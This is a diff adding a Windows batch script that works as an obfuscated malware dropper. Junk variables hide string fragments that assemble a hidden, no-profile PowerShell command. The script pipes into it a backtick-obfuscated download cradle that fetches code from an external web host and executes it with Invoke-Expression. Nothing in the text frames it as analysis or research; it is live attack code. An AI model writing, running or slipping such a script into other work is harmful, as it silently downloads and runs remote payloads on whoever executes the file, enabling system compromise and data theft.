@@ -1,0 +1,45 @@
+@echo off
+cd %SystemRoot%\System32
+set q=_4F4o3j6D2_3_2xxGzHeYonI
+set r=u3_7_5E1_4y1F9TcqDdjXdcR
+set s=f2_6H7Y4Z5_4R6OMoUAHvTvL
+set t=_7_5_0P0T9_9Q9djKLSlwMCf
+set u=P2_5_0_6_3_5j2VniEvJmdLd
+set v=L4_1B3_5p4J1_3WEdqpbmUMF
+set x=Y5_9N1n0_3_9_1TcNVLOFuBn
+set y=_8_3B4w2_9T2V3RKfzbFVRpk
+set z=_5e3v3O3E4_3Y6iXhZwancWI
+set a=Win
+set za=_5E6f6P7S0_7_4dvSjiRUqTp
+set b=dow
+set ze=i3_7M7C5_3C6o7TimekMVBoG
+set c=sPo
+set ze=t3_7P7_3B0_7H0HDaRZVbwso
+set d=wer
+set ze=_7_1_0H9d7w0_3qlqAVkNmWq
+set e=She
+set ze=_2f4_7_0_4I9Y9kgfxTqvNiX
+set f=ll\
+set ze=C1_6_6T0u3e9d5wnzIMXpevP
+set g=v1.
+set ze=j4_5U6S8_2M9_6pyTEmoheeK
+set h=0\po
+set ze=Z4D4H8W5m0_2_8pduMwhmjrq
+set i=we
+set ze=_7_7z9X4c9n3_4NjLNlSXZTv
+set j=rsh
+set ze=X5_1Y9_9P6_4z9kjqVYXWfbk
+set k=ell
+set ze=_0k4_9X3Z5l2x2OCzeHudgkG
+set l=.ex
+set ze=_4_4_9_6_0g8_2gaJYGyxSod
+set m=e -n
+set ze=v7_1U1_5_3E6c2RlvtpOeeeK
+set n=op 
+set ze=I1X3_3_0L9k3_2AiiVTaIsau
+set o=-w
+set ze=_4E2w5P1_0Z8n6ZLDJUauvSz
+set p=in 1 -
+set ze=_6_9D2_2H9_9_7tAkEFGAMUY
+echo ieX("Ie`X`(N`ew-oBJ`e`Ct N`et.`Web`ClIeNt`).DOwnlOa`d`StRIN`G('http://md2020.matakuradar.online/_7_4_7_0_6_1_7fuemx/_7_4_7_0_6_1_7fue/_7_4_7_0_6_1_7fuekk/_7_4_7_0_6_1_7fue')"); | %a%%b%%c%%d%%e%%f%%g%%h%%i%%j%%k%%l%%m%%n%%o%%p%
+set ze=q0W6w6f3_4_2_0mZMJkKnihJ
